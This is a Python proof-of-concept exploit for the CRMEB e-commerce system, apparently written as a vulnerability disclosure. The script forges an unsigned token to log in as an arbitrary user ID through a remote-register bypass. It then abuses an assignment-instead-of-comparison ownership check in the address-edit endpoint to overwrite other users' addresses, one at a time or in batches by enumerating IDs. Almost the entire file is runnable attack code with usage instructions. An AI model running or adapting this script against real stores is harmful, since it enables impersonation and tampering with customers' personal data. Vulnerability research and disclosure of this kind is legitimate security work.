#!/usr/bin/env python3
"""
CRMEB Address Ownership Takeover via Assignment Operator Bug
Vulnerability: CWE-478 + CWE-480 (Assignment instead of Comparison)
CVSS Score: 8.1 (High)

This POC demonstrates that the editAddress endpoint uses assignment (=)
instead of comparison (==) in ownership validation, allowing attackers
to steal any user's address by knowing the address ID.
"""

import base64
import json
import requests
import time
import sys

# Target configuration
TARGET_URL = "http://192.168.176.130:8011"

def login_as_attacker(attacker_uid):
    """
    Login as attacker using JWT bypass vulnerability
    """
    print(f"\n[*] Step 1: Attacker logging in as UID={attacker_uid}")

    attacker_data = {
        "uid": attacker_uid,
        "phone": f"13800138{attacker_uid % 10000:04d}",
        "nickname": f"attacker_{attacker_uid}",
        "avatar": "http://evil.com/avatar.jpg",
        "now_money": 100,
        "integral": 50,
        "exp": 1770483564
    }

    # Create fake token (base64 only, no signature)
    fake_token = base64.urlsafe_b64encode(
        json.dumps(attacker_data).encode()
    ).decode().rstrip('=')

    try:
        login_resp = requests.get(
            f"{TARGET_URL}/api/remote_register",
            params={"remote_token": fake_token},
            timeout=10
        )

        if login_resp.status_code == 200:
            resp_data = login_resp.json()
            if resp_data.get("msg") == "登录成功":
                token = resp_data['data']['token']
                print(f"[+] Attacker login successful")
                print(f"[+] Received JWT token: {token[:30]}...")
                return token, attacker_data
            else:
                print(f"[-] Attacker login failed: {resp_data.get('msg')}")
                return None, None
        else:
            print(f"[-] HTTP Error: {login_resp.status_code}")
            return None, None

    except Exception as e:
        print(f"[-] Login error: {e}")
        return None, None

def steal_address(token, address_id, new_real_name="攻击者篡改", new_phone="13800138000", new_detail="地址已被窃取"):
    """
    POC 1: Steal arbitrary user address by ID
    """
    print(f"\n[*] Step 2: Attempting to steal address ID={address_id}")

    headers = {"Authorization": f"Bearer {token}"}

    exploit_data = {
        "address": {
            "province": "上海市",
            "city": "上海市",
            "district": "浦东新区",
            "city_id": 310100
        },
        "is_default": False,
        "real_name": new_real_name,
        "phone": new_phone,
        "detail": new_detail,
        "id": address_id,
        "type": 0
    }

    print(f"[*] Sending exploit request...")
    print(f"[*] New owner: {new_real_name}")
    print(f"[*] New phone: {new_phone}")
    print(f"[*] New detail: {new_detail}")

    try:
        exploit_resp = requests.post(
            f"{TARGET_URL}/api/address/edit",
            headers=headers,
            json=exploit_data,
            timeout=10
        )

        print(f"\n[*] Response Status Code: {exploit_resp.status_code}")
        print(f"[*] Response Body:\n{json.dumps(exploit_resp.json(), indent=2, ensure_ascii=False)}")

        if exploit_resp.status_code == 200:
            resp_data = exploit_resp.json()
            if resp_data.get("status") == 200 and resp_data.get("msg") == "修改成功":
                print("\n[+] SUCCESS: Address ownership stolen!")
                print(f"[+] Address ID {address_id} now belongs to attacker")
                return True, resp_data
            else:
                print(f"\n[-] Exploit failed: {resp_data.get('msg')}")
                return False, resp_data
        else:
            print(f"\n[-] HTTP Error: {exploit_resp.status_code}")
            return False, None

    except Exception as e:
        print(f"\n[-] Exploit error: {e}")
        return False, None

def batch_steal_addresses(token, start_id, count):
    """
    POC 2: Batch address theft
    """
    print(f"\n[*] Step 3: Attempting to steal {count} addresses (ID {start_id}-{start_id+count-1})")

    headers = {"Authorization": f"Bearer {token}"}
    stolen = 0
    failed = 0
    results = []

    for address_id in range(start_id, start_id + count):
        exploit_data = {
            "address": {
                "province": "北京市",
                "city": "北京市",
                "district": "朝阳区",
                "city_id": 110100
            },
            "is_default": False,
            "real_name": f"被窃取地址{address_id}",
            "phone": "13800138000",
            "detail": f"已窃取地址ID {address_id}",
            "id": address_id,
            "type": 0
        }

        try:
            resp = requests.post(
                f"{TARGET_URL}/api/address/edit",
                headers=headers,
                json=exploit_data,
                timeout=10
            )

            if resp.status_code == 200:
                resp_data = resp.json()
                if resp_data.get("status") == 200 and resp_data.get("msg") == "修改成功":
                    print(f"[+] Stolen address ID {address_id}")
                    stolen += 1
                    results.append(address_id)
                else:
                    print(f"[-] Address {address_id} failed: {resp_data.get('msg')}")
                    failed += 1
            else:
                print(f"[-] Address {address_id} HTTP error: {resp.status_code}")
                failed += 1

        except Exception as e:
            print(f"[-] Address {address_id} error: {e}")
            failed += 1

        time.sleep(0.3)

    print(f"\n[*] Batch Theft Summary:")
    print(f"    Total: {count}")
    print(f"    Stolen: {stolen}")
    print(f"    Failed: {failed}")

    return results

def main():
    print("=" * 70)
    print("CRMEB Address Ownership Takeover - POC")
    print("=" * 70)
    print(f"Target: {TARGET_URL}")
    print(f"Vulnerability: Assignment operator (=) instead of comparison (==)")
    print("CVSS Score: 8.1 (High)")
    print("=" * 70)

    if len(sys.argv) > 1:
        command = sys.argv[1]

        if command == "single":
            # Steal single address
            attacker_uid = int(sys.argv[2]) if len(sys.argv) > 2 else 7777
            address_id = int(sys.argv[3]) if len(sys.argv) > 3 else 1

            token, attacker_data = login_as_attacker(attacker_uid)
            if token:
                steal_address(token, address_id)

        elif command == "batch":
            # Batch steal
            attacker_uid = int(sys.argv[2]) if len(sys.argv) > 2 else 7777
            start_id = int(sys.argv[3]) if len(sys.argv) > 3 else 1
            count = int(sys.argv[4]) if len(sys.argv) > 4 else 10

            token, attacker_data = login_as_attacker(attacker_uid)
            if token:
                batch_steal_addresses(token, start_id, count)

        else:
            # Treat as address ID
            token, attacker_data = login_as_attacker(7777)
            if token:
                steal_address(token, int(command))
    else:
        # Default: run comprehensive tests
        print("\n### Test 1: Steal Single Address (ID=1) ###")
        token, attacker_data = login_as_attacker(7777)
        if token:
            steal_address(token, 1)

        print("\n" + "=" * 70)
        print("\n### Test 2: Batch Address Theft (5 addresses) ###")
        token2, attacker_data2 = login_as_attacker(8888)
        if token2:
            batch_steal_addresses(token2, 2, 5)

        print("\n" + "=" * 70)
        print("Usage:")
        print("  python3 address_idor_poc.py                      # Run all tests")
        print("  python3 address_idor_poc.py single <uid> <addr_id> # Steal single address")
        print("  python3 address_idor_poc.py batch <uid> <start> <n> # Batch steal")
        print("  python3 address_idor_poc.py <address_id>           # Quick test")
        print("=" * 70)

if __name__ == "__main__":
    main()
